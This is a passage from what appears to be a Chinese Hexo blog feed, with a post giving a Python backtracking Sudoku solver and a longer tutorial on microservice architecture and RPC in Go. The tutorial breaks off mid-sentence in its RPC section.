        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>启发式方法求解数独</p></blockquote><a id="more"></a><h1 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h1><ul><li>sukudo棋盘是一种逻辑游戏，由<code>9*9</code>的网格组成。玩法要求每一行、每一列、每个<code>3*3</code>的子网格都由<code>1~9</code>九个数字填充，并且每行每列每个子网格填充的数字都不重复。</li><li>现给定一个<code>9*9</code>的二维数组，求满足条件的填充算法。</li></ul><h1 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h1><ul><li>类似八皇后算法，这种题可以使用启发式搜索，即从<code>1~9</code>找出一个满足条件的数字，然后下一步，如果找不到则意味上一步数字不合适，于是退回上一步，重新选取合适数字。如果还是不行，则继续回退。这种走入死胡同就回退寻找新出路的方式就是启发式搜索。</li></ul><h1 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h1><ul><li>启发式搜索是一种暴力枚举法，把所有可能的方式都尝试一遍。时间复杂度是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mn>9</mn><mn>9</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(9^9)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord">9</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</li></ul><h1 id="代码"><a class="markdownIt-Anchor" href="#代码"></a> 代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sukudo</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,puzzle</span>):</span></span><br><span class="line">        self.puzzle = puzzle</span><br><span class="line">        self.sukudoBoard = puzzle</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printSukudoBoard</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">                print(<span class="string">&#x27;&#123;&#125;&#x27;</span>.format(self.sukudoBoard[i][j]), end=<span class="string">&quot;  &quot;</span>)</span><br><span class="line">            print()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkValid</span>(<span class="params">self, i, j, val</span>):</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> k != j <span class="keyword">and</span> self.sukudoBoard[i][k] == val: <span class="comment"># 检测行是否重复</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> k != i <span class="keyword">and</span> self.sukudoBoard[k][j] == val: <span class="comment"># 检测列是否重复</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        subX = int(i / <span class="number">3</span>) * <span class="number">3</span></span><br><span class="line">        subY = int(j / <span class="number">3</span>) * <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> range(subX, subX + <span class="number">3</span>):  <span class="comment"># 检测网格是否重复</span></span><br><span class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> range(subY, subY + <span class="number">3</span>):</span><br><span class="line">                <span class="keyword">if</span> p != i <span class="keyword">and</span> q != j <span class="keyword">and</span> self.sukudoBoard[p][q] == val:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setSukudoBoard</span>(<span class="params">self, x, y</span>):</span></span><br><span class="line">        <span class="keyword">if</span> y &gt; <span class="number">8</span>:</span><br><span class="line">            y = <span class="number">0</span></span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> x &gt; <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> self.puzzle[x][y] != <span class="number">0</span>:  <span class="comment"># 判断是否是谜题，谜题不需要尝试填充数字，直接用谜题val就可以</span></span><br><span class="line">            <span class="keyword">if</span> self.setSukudoBoard(x, y + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.sukudoBoard[x][y] = self.puzzle[x][y]</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> val <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):  <span class="comment"># 从给定位置从1~9开始填充</span></span><br><span class="line">            <span class="keyword">if</span> self.checkValid(x, y, val) <span class="keyword">is</span> <span class="literal">True</span>: <span class="comment"># 满足条件进行下一个网格</span></span><br><span class="line">                self.sukudoBoard[x][y] = val</span><br><span class="line">                <span class="keyword">if</span> self.setSukudoBoard(x, y + <span class="number">1</span>): <span class="comment"># 下一个网格满足则返回true，不满足重新设置val</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        self.sukudoBoard[x][y] = <span class="number">0</span> <span class="comment"># 不满足则该网格至0，返回false，上一步重新填充数字</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    puzzle = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    000600000</span></span><br><span class="line"><span class="string">    006730590</span></span><br><span class="line"><span class="string">    083010700</span></span><br><span class="line"><span class="string">    040107003</span></span><br><span class="line"><span class="string">    000300900</span></span><br><span class="line"><span class="string">    900008000</span></span><br><span class="line"><span class="string">    000000001</span></span><br><span class="line"><span class="string">    009000006</span></span><br><span class="line"><span class="string">    700801040</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    puzzle = [ [int(l) <span class="keyword">for</span> l <span class="keyword">in</span> k] <span class="keyword">for</span> k <span class="keyword">in</span> [list(j) <span class="keyword">for</span> j <span class="keyword">in</span> [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> puzzle.split(<span class="string">&quot;\n&quot;</span>) <span class="keyword">if</span> i.strip()]]]</span><br><span class="line">    s = Sukudo(puzzle)</span><br><span class="line">    <span class="keyword">if</span> s.setSukudoBoard(<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">        s.printSukudoBoard()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;该数独无解&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> funny </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang微服务</title>
      <link href="/2020/06/24/golang%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
      <url>/2020/06/24/golang%E5%BE%AE%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>golang微服务总结</p></blockquote><a id="more"></a><h1 id="微服务简介"><a class="markdownIt-Anchor" href="#微服务简介"></a> 微服务简介</h1><h2 id="单体应用"><a class="markdownIt-Anchor" href="#单体应用"></a> 单体应用</h2><ul><li><p>所谓的单体应用就是指一个<code>war</code>包包含了项目的所有功能。比如上述举例的打车应用，尽管有一个逻辑模块化架构，但应用程序被作为一个单体进行打包和部署。例如，我们所熟知的许多<code>Java</code>应用程序被打包成WAR文件部署在如<code>Tomcat</code>或者<code>Jetty</code>之类的应用服务器上。其他<code>Java</code>应用程序被打包成可执行<code>JAR</code>包。</p></li><li><p>单体应用的特点：</p><ul><li><strong>容易开发</strong>：开发者只需要在专用的开发工具上比如（<code>Eclipse</code>，<code>myEclipse</code>)等就可以管理整个项目代码，完成代码开发工作。</li><li><strong>容易运行和测试</strong>：既然我们能够在本地开发工具上完成整个项目的功能开发和调试，自然也就很容易在我们本地环境上进行测试调试。</li><li><strong>容易部署</strong>：正如我们在举例单体应用构建项目时所说，当应用程序开发，调试，测试完成以后，我们只需要将代码进行打包，然后将打包好的应用程序拷贝到服务器上进行部署即可。</li></ul></li><li><p>局限性</p></li><li><p>但是，随着系统业务的不断增长，代码量不断增加，我们维护创建的单体应用系统的性能和维护成本都会受到限制，限制了我们继续新增新业务的能力。</p></li><li><p>一旦应用程序成为了一个庞大、复杂的单体应用，整个开发团队可能就会陷入一个痛苦的境地，可能会遇到很多很多的问题，比如说：</p><ul><li><strong>敏捷开发受挫</strong>：主要问题是：应用程序实在非常复杂，其对于任何一个开发人员来说显得过于庞大。最终，正确修复 <code>bug</code> 和实现新功能变得非常困难而耗时。就拿应用启动时间这一项指标来说，应用程序越大，启动时间越长。曾经听说过某应用程序启动需要 40 分钟以上的怪事。如果开发人员经常要重启应用服务器，那么很大一部分时间都是在等待中度过，这将极大的影响我们的工作效率。</li><li><strong>持续部署受挫</strong>：另一个大问题是，复杂的单体应用本身就是持续部署的障碍。如今，<code>SaaS</code>（<code>Software-as-a-Service</code>软件即服务）应用发展到了可以每天多次将变更推送到生产环境。这对于复杂的单体来说非常困难，因为这需要重新部署整个应用程序才能更新其中任何一部分。联想到之前提到的漫长启动时间，这也不会是什么好事。此外，因变更所产生的影响通常不是很明确，开发者很可能需要做大量的手工测试。比如，我们仅仅是修改某个部分的代码，但是因为是全部部署，因此我们必须要重新将整个系统进行全链路测试，这样将耗费非常多额外的时间。因此，持续部署是不可能做到的。</li><li><strong>应用难以扩展</strong>：当不同模块存在资源需求冲突时，单体应用可能难以扩展。例如，一个模块可能会进行密集型图像处理逻辑，理想情况下是部署在云服务器A实例中；另一个模块可能是一个内存数据库，最适合部署到云服务器B实例中。但是，由于这些模块是属于同一个应用，只能被部署在一起，此时就要求运维人员必须在硬件选择上做出妥协和让步，因此就使得原本我们设计的系统处理业务的能力会受到硬件环境的限制。</li><li><strong>可靠性低</strong>：单体应用的另一个问题是可靠性低。因为所有模块都运行在同一进程中。任何模块的一个<code>bug</code>，比如内存泄漏，可能会拖垮整个进程。此外，由于应用程序的所有实例都是相同的，该错误将影响到整个应用的可用性，对整个应用都造成影响。</li><li><strong>技术升级困难</strong>：单体应用因为提及庞大，使得采用新框架和语言变得非常困难。假设有50万行代码使用了某个框架编写。如果使用较新的一个框架来重写整个应用，这将非常昂贵（在时间和成本方面）。因此，这对于团队采用新技术，对系统进行技术升级来说是一个非常大的障碍。</li></ul></li><li><p>最后，经过了上面几个方面的问题的罗列，我们总结一下：当我们开发个业务量小，功能适量的一个项目应用时，通过单体应用的开发，就可以满足我们的开发需求，实现业务功能。当业务量快速增长，系统持续开发迭代时，我们的应用体积和业务复杂程度会越来越高，以至于影响开发人员的开发效率，提高了项目的维护成本，我们的项目会遇到各种瓶颈问题，应用程序的持续扩展能力受到限制，性能也因此受到影响。</p></li><li><p>既然实际生产环境中遇到了这样的难题，作为项目管理者和项目开发者，就必须想办法解决出现的这些问题。</p></li><li><p>我们如何做才能解决项目持续迭代后遇到的扩展能力受限和各种瓶颈问题呢？答案是<span style="color:red;">微服务</span>。</p></li></ul><h2 id="如何解决复杂问题"><a class="markdownIt-Anchor" href="#如何解决复杂问题"></a> 如何解决复杂问题</h2><ul><li>许多大公司如阿里巴巴，腾讯，微博，滴滴等，已经采用现在所谓的微服务架构模式解决了我们前文所提到的单体应用遇到的种种问题。主要的思路：将应用程序分解成一套较小的互连服务。</li></ul><h3 id="微服务架构"><a class="markdownIt-Anchor" href="#微服务架构"></a> 微服务架构</h3><ul><li><p>一个服务通常实现了一组不同的特性或功能，例如订单管理、客户管理等。每一个微服务都是一个小型迷你应用，在需要依赖的地方，通过<code>REST API</code>连接其他所需要的服务之星业务逻辑。</p></li><li><p>具体的表现为：应用程序的每个功能区域现在都由自己的微服务实现。例如，以我们的出租车系统为例，一个是乘客的应用，一个是司机的应用。这使得它更容易地为特定的用户、司机、设备或者专门的用例部署不同的场景。每个后端服务暴露一个<code>REST API</code>，大部分服务消费的API由其他服务提供。例如，<code>Driver Management</code> 使用了 <code>Notification</code> 服务器来通知可用司机一个可选路程。<code>UI</code>服务调用了其他服务来渲染页面。</p></li></ul><h3 id="微服务与数据库"><a class="markdownIt-Anchor" href="#微服务与数据库"></a> 微服务与数据库</h3><ul><li>既然我们将微服务架构模式明显影响到了应用程序与数据库之间的关系，与其他共享单个数据库模式服务有所不同，其每一个服务都有自己的数据库模式。一方面，这种做法与企业级数据库数据模型的想法相背，此外，它经常导致部分数据冗余。对于微服务架构而言，每一个服务都应该有自己的数据库模式，因为它能实现松耦合。</li></ul><p><img src="/images/pasted-18.png" alt="微服务与数据库" /></p><ul><li>这种模式下设计架构的特点是每个服务都拥有各自的数据库。而且，服务可以使用一种最适合其需求、号称多语言持久架构的数据库。比如，Driver Management要找到与潜在乘客接近的司机，就必须使用支持高效地理查询的数据库。</li></ul><h2 id="微服务的优缺点"><a class="markdownIt-Anchor" href="#微服务的优缺点"></a> 微服务的优缺点</h2><h3 id="微服务优点"><a class="markdownIt-Anchor" href="#微服务优点"></a> 微服务优点</h3><ul><li><strong>解决复杂问题</strong>：微服务架构把可能会变得庞大的单体应用程序分解成一套服务。虽然功能数量不变，但是应用程序已经被分解成可管理的块或者服务。每个服务都有一个明确定义边界的方式，如远程过程调用（RPC）驱动或API。微服务架构模式强制一定程度的模块化，实际上，使用单体代码来实现是极其困难的。因此，使用微服务架构模式，个体服务能被更快地开发，并更容易理解与维护。</li><li><strong>团队分工协作更容易</strong>：微服务这种架构使得每个服务都可以由一个团队独立专注开发。开发者可以自由选择任何符合服务API的技术。当然，更多的组织是希望通过技术选型限制来避免完全混乱的状态。然而，这种自由意味着开发人员不再有可能在这种自由的新项目开始时使用过时的技术。当编写一个新服务时，他们可以选择当前的技术。此外，由于微服务体积较小，使用当前技术重写旧服务将变得更加可行。</li><li><strong>独立部署</strong>：微服务架构模式可以实现每个微服务独立部署。开发人员根本不需要去协调部署本地变更到服务。这些变更一经测试即可立即部署。比如，UI团队可以经过自己的开发和测试，并快速迭代UI变更。微服务架构模式使每个聚焦于自己核心业务的团队有了更多的自主权。</li><li><strong>程序扩展能力强</strong>：微服务架构模式使得每个服务能够独立扩展。开发者可以仅部署满足每个服务的容量和可用性约束的实例数目，另外每个开发团队还可以使用与服务资源要求最匹配的硬件。比如，我们可以在云服务器A实例上部署一个图像处理服务，而在云服务器B实例上部署一个内存数据库服务。微服务架构下使得我们分开部署实例变成了现实。</li><li>以上几点是，我们描述了微服务的优点。和单体应用相比，微服务有其优点，当然也会有不足。</li></ul><h3 id="微服务缺点"><a class="markdownIt-Anchor" href="#微服务缺点"></a> 微服务缺点</h3><ul><li><strong>规模难以界定</strong>：如同微服务的名字一样，以微服务架构为主的设计模式重点过于强调拆分和微型，以至于会导致一个大型项目会被拆分出很多的微服务实例。在拆分的过程中，如何定义微服务迷你应用的规模，往往存在着不同的标准，有人是以核心功能为标准，有人主张以代码量为标准。总之，衡量标准不一。我们需要强调的是：微服务仅仅是一种技术手段，而不是主要目标。微服务的目标在于充分分解应用程序以方便应用敏捷开发和部署。</li><li><strong>增加系统复杂度</strong>：因为微服务是独立部署，拆分成各个功能服务实例。因此，原本的单体应用就变成了一个分布式系统，如何管理这个分布式系统，无形之中增加了原有应用程序的复杂度。在分布式系统中，要实现各个微服务实例之间的通信和业务调用，开发者需要选择和实现基于消息或者RPC框架的进程间通信机制来实现微服务间通信。另外，多个微服务调用之间的请求，调试，协调等问题，也会增加团队间的沟通成本，相比起单体应用来说，微服务架构在这一点上也要更复杂。</li><li><strong>分区数据库架构难题</strong>：当我们在进行正常的业务开发时，往往需要涉及到多个模块之间的数据调用和数据更新。在原来的单体应用下，比较容易实现，我们只需要操作不同的实体表就可以实现，但是在微服务架构中，因为数据存储是独立存储和部署，这导致我们在某个业务中更新多个模块数据时，我们需要调用不同的微服务接口API依次更新。在实际的开发和实践过程中，这个问题也会成为开发人员的主要困扰之一。</li><li><strong>项目测试难度增加</strong>：在原来的单体应用中，开发者可以通过在统一的测试目录下统一编写测试用例和测试方法，然后启动应用服务，进行测试系统功能，对开发人员来说这是常见的做法也是比较熟悉的做法。相比较而言，如果我们要进行微服务的功能测试，就需要将所依赖的所有的微服务都要启动起来才能执行。虽然这个工作难度不大，但是要知道，一旦我们的某个微服务实例依赖的其他实例数量较多时，对开发者调试的工作量来说，是直线上升的。</li><li><strong>多服务修改更加困难</strong>：比如在原本的单体应用中存在三个模块，分别为：模块A、模块B和模块C。当我们有业务逻辑需要进行修改时，我们只需要在同一个应用程序中协作修改三个模块，完成业务功能的调整，然后测试并上线。但是在微服务中，当我们需要横框多个微服务实例间进行业务调整时，就需要仔细认真规划和协调，以便完成整个业务的调整。这样对开发者来说，迭代维护的成本也会增加。</li><li><strong>微服务需要进行多次部署</strong>：原来的单体应用在部署时，可以通过将所有的项目模块打包到一个整体的部署包内，然后部署到一台或者一组服务器上。相比较之下，将程序改为微服务架构以后，应用程序的数量就变多了，这样在整体运行时就需要部署多次，这是一个不小的工作量。</li><li>以上几点是微服务架构不足的地方。我们必须要辩证的看待和使用微服务，本质上它是一项技术，我们要利用微服务技术解决现实项目中的问题。</li></ul><h2 id="微服务的定义"><a class="markdownIt-Anchor" href="#微服务的定义"></a> 微服务的定义</h2><ul><li>结合我们之前所了解到的文章和相关知识，并结合相关资料。我们借鉴微服务之父Martin先生给微服务的定义：将一个单体应用拆分成一组微小的服务组件，每个微小的服务组件运行在自己的进程上，组件之间通过如RESTful API这样的轻量级机制进行交互，这些服务以业务能力为核心，用自动化部署机制独立部署，另外，这些服务可以用不同的语言进行研发，用不同技术来存储数据。通过以上的定义描述，我们可以基本确定给出微服务的节特征，如下所示：<ul><li>在分布式环境中，将单体应用拆分为一系列服务，共同组成整个系统。</li><li>每个服务都轻量级，单独部署，运行在自己的进程中。</li><li>每个微服务注重自己的核心能力的开发，微服务组件之间采用轻量级通信方式进行通信，包括但不限于RESTful API。</li><li>按照业务边界进行划分。</li><li>微服务是一种编程架构思想，有不同的语言实现。</li></ul></li></ul><h2 id="微服务实践要解决的问题"><a class="markdownIt-Anchor" href="#微服务实践要解决的问题"></a> 微服务实践要解决的问题</h2><ul><li>用微服务来进行实践到生产项目中，首先要解决一些问题。比如下图的微服务业务架构：</li></ul><p><img src="/images/pasted-19.png" alt="微服务架构" /></p><ul><li>在上图图表展示的架构图中，我们假设将业务商户服务A、订单服务B和产品服务C分别拆分为一个微服务应用，单独进行部署。此时，我们面临很多要可能出现的问题要解决，比如：<ol><li>客户端如何访问这些服务？</li><li>每个服务之间如何进行通信？</li><li>多个微服务，应如何实现？</li><li>如果服务出现异常宕机，该如何解决？</li></ol></li></ul><h3 id="客户端如何访问服务"><a class="markdownIt-Anchor" href="#客户端如何访问服务"></a> 客户端如何访问服务</h3><ul><li>在单体应用开发中，所有的服务都是本地的，前端UI界面，移动端APP程序可以直接访问后端服务器程序。</li><li>现在按功能拆分成独立的服务，跑在独立的进程中。如下图所示：</li></ul><p><img src="/images/pasted-20.png" alt="多服务部署" /></p><ul><li><p>此时，后台有N个服务，前台就需要记住管理N个服务，一个服务下线、更新、升级，前台和移动端APP就要重新部署或者重新发包，这明显不服务我们拆分的理念。尤其是对当下业务需求的飞速发展，业务的变更是非常频繁的。</p></li><li><p>除了访问管理出现困难以外，N个小服务的调用也是一个不小的网络开销。另外，一般微服务在系统内部，通常是无状态的，而我们的用户在进行业务操作时，往往是跨业务模块进行操作，且需要是有状态的，在此时的这个系统架构中，也无法解决这个问题。传统的用来解决用户登录信息和权限管理通常有一个统一的地方维护管理（OAuth），我们称之为授权管理。</p></li><li><p>基于以上列出的问题，我们采用一种叫做网关（英文为API Gateway）的技术方案来解决这些问题，网关的作用主要包括：</p><ul><li>提供统一服务入口，让微服务对前台透明</li><li>聚合后台的服务，节省流量，提升性能</li><li>提供安全，过滤，流控等API管理功能</li></ul></li><li><p>网关(API Gateway)可以有很多广义的实现办法，可以是一个软硬一体的盒子，也可以是一个简单的MVC框架，甚至是一个Node.js的服务端。他们最重要的作用是为前台（通常是移动应用）提供后台服务的聚合，提供一个统一的服务出口，解除他们之间的耦合，不过API Gateway也有可能成为单点故障点或者性能的瓶颈。</p></li><li><p>最终，添加了网关(API Gateway)的业务架构图变更为如下所示：</p></li></ul><p><img src="/images/pasted-21.png" alt="网关" /></p><h3 id="服务之间如何通信"><a class="markdownIt-Anchor" href="#服务之间如何通信"></a> 服务之间如何通信</h3><ul><li>所有的微服务都是独立部署，运行在自己的进程容器中，所以微服务与微服务之间的通信就是IPC（Inter Process Communication），翻译为进程间通信。进程间通信的方案已经比较成熟了，现在最常见的有两大类：同步调用、异步消息调用。</li></ul><h4 id="同步调用"><a class="markdownIt-Anchor" href="#同步调用"></a> 同步调用</h4><ul><li>同步调用比较简单，一致性强，但是容易出调用问题，性能体验上也会差些，特别是调用层次多的时候。同步调用的有两种实现方式：分别是REST和RPC<ul><li>REST：REST基于HTTP，实现更容易，各种语言都支持，同时能够跨客户端，对客户端没有特殊的要求，只要具备HTTP的网络请求库功能就能使用。</li><li>RPC：rpc的特点是传输效率高，安全性可控，在系统内部调用实现时使用的较多。</li></ul></li><li>基于REST和RPC的特点，我们通常采用的原则为：向系统外部暴露采用REST，向系统内部暴露调用采用RPC方式。</li></ul><h4 id="异步消息调用"><a class="markdownIt-Anchor" href="#异步消息调用"></a> 异步消息调用</h4><ul><li>异步消息的方式在分布式系统中有特别广泛的应用，他既能减低调用服务之间的耦合，又能成为调用之间的缓冲，确保消息积压不会冲垮被调用方，同时能保证调用方的服务体验，继续干自己该干的活，不至于被后台性能拖慢。需要付出的代价是一致性的减弱，需要接受数据最终一致性，所谓的最终一致性就是只可能不会立刻同步完成，会有延时，但是最终会完成数据同步；还有就是后台服务一般要实现幂等性，因为消息送出于性能的考虑一般会有重复（保证消息的被收到且仅收到一次对性能是很大的考验）。最后就是必须引入一个独立的 Broker，作为中间代理池。</li><li>常见的异步消息调用的框架有：Kafaka、Notify、MessageQueue。</li><li>最终，大部分的服务间的调用架构实现如下所示：</li></ul><p><img src="/images/pasted-22.png" alt="服务间通信" /></p><h3 id="如何实现众多微服务"><a class="markdownIt-Anchor" href="#如何实现众多微服务"></a> 如何实现众多微服务</h3><ul><li><p>在微服务架构中，一般每一个服务都是有多个拷贝，来做负载均衡。一个服务随时可能下线，也可能应对临时访问压力增加新的服务节点。这就出现了新的问题：</p></li><li><p>服务之间如何相互感知？例如有新的服务实例上线，已上线的实例如何知道并与之通信。</p></li><li><p>服务如何管理？服务实例数量多了，也面临着如何管理的问题。</p></li><li><p>这就是服务的发现、识别与管理问题。解决多服务之间的识别，发现的问题一般是通过注册的方式来进行。</p></li><li><p>具体来说：当服务上线时，服务提供者将自己的服务注册信息注册到某个专门的框架中，并通过心跳维持长链接，实时更新链接信息。服务调用者通过服务管理框架进行寻址，根据特定的算法，找到对应的服务，或者将服务的注册信息缓存到本地，这样提高性能。当服务下线时，服务管理框架会发送服务下线的通知给其他服务。</p></li><li><p>常见的服务管理框架有：Zookeeper等框架。</p></li><li><p>如上的问题解决方案有两种具体的实现，分别是：基于客户端的服务注册与发现、基于服务端的服务注册与发现。</p></li><li><p>基于客户端的服务注册与发现</p><ul><li>优点是架构简单，扩展灵活，只对服务注册器依赖。缺点是客户端要维护所有调用服务的地址，有技术难度，一般大公司都有成熟的内部框架支持。<br /><img src="/images/pasted-23.png" alt="基于客户端的服务注册与发现" /></li></ul></li><li><p>基于服务端的服务注册与发现</p><ul><li>优点是简单，所有服务对于前台调用方透明，一般在小公司在云服务上部署的应用采用的比较多。</li></ul></li></ul><p><img src="/images/pasted-24.png" alt="基于服务端的服务注册与发现" /></p><h3 id="服务宕机等异常情况的处理"><a class="markdownIt-Anchor" href="#服务宕机等异常情况的处理"></a> 服务宕机等异常情况的处理</h3><ul><li>前面提到，单体应用开发一个很大的风险是，把所有鸡蛋放在一个篮子里，一荣俱荣，一损俱损。而分布式最大的特性就是网络是不可靠的。通过微服务拆分能降低这个风险，不过如果没有特别的保障，结局肯定是噩梦。</li><li>因此，当我们的系统是由一系列的服务调用链组成的时候，我们必须确保任一环节出问题都不至于影响整体链路。相应的手段有很多，比如说：<ul><li>重试机制</li><li>限流</li><li>熔断机制</li><li>负载均衡</li><li>降级（本地缓存）</li></ul></li></ul><h1 id="rpc服务"><a class="markdownIt-Anchor" href="#rpc服务"></a> RPC服务</h1><h2 id="rpc简介"><a class="markdownIt-Anchor" href="#rpc简介"></a> RPC简介</h2><h3 id="rpc通信"><a class="markdownIt-Anchor" href="#rpc通信"></a> RPC通信</h3><ul><li>对于单独部署，独立运行的微服务实例而言，在业务需要时，需要与其他服务进行通信，这种通信方式是进程之间的通讯方式（inter-process communication，简称IPC）。</li><li>前文已经描述过，IPC有两种实现方式，分别为：同步过程调用、异步消息调用。在同步过程调用的具体实现中，有一种实现方式为RPC通信方式，远程过程调用（英语：Remote Procedure Call，缩写为 RPC）。</li><li>远程过程调用（英语：Remote Procedure Call，缩写为RPC）是一个计算机通信协议。该协议允许运行于一台计算机的程序调用另一台计算机的子程序，而程序员无需额外地为这个交互作用编程。如果涉及的软件采用面向对象编程，那么远程过程调用亦可称作远程调用或远程方法调用，例：Java RMI。简单地说就是能使应用像调用本地方法一样的调用远程的过程或服务。很显然，这是一种client-server的交互形式，调用者(caller)是client,执行者(executor)是server。典型的实现方式就是request–response通讯机制。</li></ul><h3 id="rpc设计组成"><a class="markdownIt-Anchor" href="#rpc设计组成"></a> RPC设计组成</h3><ul><li>RPC技术在架构设计上有四部分组成，分别是：客户端、客户端存根、服务端、服务端存根。</li><li>这里提到了客户端和服务端的概念，其属于程序设计架构的一种方式，在现代的计算机软件程序架构设计上，大方向上分为两种方向，分别是：B/S架构、C/S架构。B/S架构指的是浏览器到服务器交互的架构方式，另外一种是在计算机上安装一个单独的应用，称之为客户端，与服务器交互的模式。</li><li>由于在服务的调用过程中，有一方是发起调用方，另一方是提供服务方。因此，我们把服务发起方称之为客户端，把服务提供方称之为服务端。以下是对RPC的四种角色的解释和说明：<ul><li>客户端(Client)：服务调用发起方，也称为服务消费者。</li><li>客户端存根(Client Stub)：该程序运行在客户端所在的计算机机器上，主要用来存储要调用的服务器的地址，另外，该程序还负责将客户端请求远端服务器程序的数据信息打包成数据包，通过网络发送给服务端Stub程序；其次，还要接收服务端Stub程序发送的调用结果数据包，并解析返回给客户端。</li><li>服务端(Server)：远端的计算机机器上运行的程序，其中有客户端要调用的方法。</li><li>服务端存根(Server Stub)：接收客户Stub程序通过网络发送的请求消息数据包，并调用服务端中真正的程序功能方法，完成功能调用；其次，将服务端执行调用的结果进行数据处理打包发送给客户端Stub程序。</li></ul></li></ul><h3 id="rpc-实现步骤"><a class="markdownIt-Anchor" href="#rpc-实现步骤"></a> RPC 实现步骤</h3><ul><li>一个正常的RPC过程可以分为一下几个步骤：<ol><li>client调用client stub，这是一次本地过程调用。</li><li>client stub将参数打包成一个消息，然后发送这个消息。打包过程也叫做marshalling。</li><li>client所在的系统将消息发送给server。</li><li>server的的系统将收到的包传给server stub。</li><li>server stub解包得到参数。 解包也被称作 unmarshalling。</li><li>server stub调用服务过程。返回结果按照相反的步骤传给client。</li></ol></li><li>在上述的步骤实现远程接口调用时，所需要执行的函数是存在于远程机器中，即函数是在另外一个进程中执行的。因此，就带来了几个新问题：<ul><li>Call ID映射。远端进程中间可以包含定义的多个函数，本地客户端该如何告知远端进程程序调用特定的某个函数呢？因此，在RPC调用过程中，所有的函数都需要有一个自己的ID。开发者在客户端（调用端）和服务端（被调用端）分别维护一个{函数&lt;–&gt;Call ID}的对应表。两者的表不一定完全相同，但是相同的函数对应的Call ID必须相同。当客户端需要进行远程调用时，调用者通过映射表查询想要调用的函数的名称，找到对应的Call 